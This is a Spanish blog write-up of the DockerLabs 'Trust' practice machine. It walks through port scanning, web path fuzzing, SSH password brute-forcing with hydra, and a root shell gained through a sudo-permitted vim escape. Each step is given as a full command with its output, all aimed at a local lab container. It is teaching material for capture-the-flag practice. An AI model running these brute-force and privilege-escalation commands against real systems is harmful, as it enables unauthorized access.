---
title: Trust
date: 2025-08-23 18:00:00 +0200
categories: [writeup, dockerlabs]
tags: [dockerlabs, explotación web, escalada privilegios]     
image:
    path: https://dockerlabs.es/static/images/logos/logo.png
    alt: Docker Labs
---

## Trust

>Autor: El Pingüino de Mario
Dificultad: Muy Fácil
Fecha de creación: 22/04/2025
{: .prompt-tip }

Como es tan sencillo usar los contenedores de Dockerlabs he pensado creo que voy a empezar a lanzarlos directamente dentro de la máquina Kali25, por homogeneizar un entorno, aunque habrá herramientas que acabe instalado por necesidad de los retos.  

## Reconocimiento
Lanzo el contenedor y para empezar visito la dirección a ver si tiene un servidor web corriendo y lo tiene, pero con la página por defecto **Apache2 Debian Default Page**

Viendo esto opto por el escaneo con nmap. 

```shell
┌──(kali㉿kali25)-[~/Dockerlabs/trust]
└─$ nmap -p- -sV -T4 -vv 10.89.0.2    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 15:43 CEST
NSE: Loaded 47 scripts for scanning.
Initiating ARP Ping Scan at 15:43
Scanning 10.89.0.2 [1 port]
Completed ARP Ping Scan at 15:43, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:43
Completed Parallel DNS resolution of 1 host. at 15:44, 13.00s elapsed
Initiating SYN Stealth Scan at 15:44
Scanning 10.89.0.2 [65535 ports]
Discovered open port 22/tcp on 10.89.0.2
Discovered open port 80/tcp on 10.89.0.2
Completed SYN Stealth Scan at 15:44, 0.85s elapsed (65535 total ports)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
MAC Address: E6:35:17:0B:61:11 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.45 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

Para buscar páginas no listadas uso la herramienta **Wfuzz** y como payloads un listado de directorios de **Seclist**

``` shell
┌──(kali㉿kali25)-[~/Dockerlabs/trust]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404 http://10.89.0.2/FUZZ.php 

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.89.0.2/FUZZ.php
Total requests: 1273832

=====================================================================
ID           Response   Lines    Word       Chars       Payload                           
===================================================================== 
000005261:   200        39 L     78 W       926 Ch      "secret"    
```

Parece que encontramos una web **secret.php**

``` html

Hola Mario,

Esta web no se puede hackear.
```

## Explotación

Después de una inspección con el navegador, parece que efectivamente la web va a ser difícil de hackear, no tiene ningún punto de entrada, tampoco tiene controles, ni parece recibir ningún tipo de parámetro o siquiera ofrece unas cookies durante la sesión, con lo que no parece "hackeable".

¿Probamos con la fuerza bruta? Al menos tenemos un posible usuario **mario**

``` shell
┌──(kali㉿kali25)-[~/Dockerlabs/trust]
└─$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://10.89.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-23 21:01:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.89.0.2:22/
[22][ssh] host: 10.89.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```
Vaya parece que ***mario*** usa una password muy débil que nos va a permitir entrar al sistema por SSH.

## Escalada de privilegios

``` shell
                                                                                                                                                            
┌──(kali㉿kali25)-[~/Dockerlabs/trust]
└─$ ssh mario@10.89.0.2
mario@10.89.0.2's password: 
mario@2dc2475cc677:~$ sudo -l
Matching Defaults entries for mario on 2dc2475cc677:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 2dc2475cc677:
    (ALL) /usr/bin/vim
```
Lo interesante aquí es saber que parece que puede correr vim con privilegios, eso me hace pensar que es posible utilizar vim para o escalar privilegios. Si consultamos [https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/) nos sugiere explotar vim de la siguiten manera

It can be used to break out from restricted environments by spawning an interactive system shell.
>vim -c ':!/bin/sh'

Efectivamente podemos llamar a una shell desde vim, probemos pero con privilegios.
``` shell
mario@79321b51ed1e:~$ sudo vim -c ':!/bin/sh'
[sudo] password for mario: 

# whoami
root
```

La web era solo para obtener información del usuario. Luego tenemos la fuerza bruta contra un servicio SSH, claro que con una contraseña muy débil y por último elevación de privilegios mediante una configuración insegura en este caso del fichero ```/etc/sudoers```


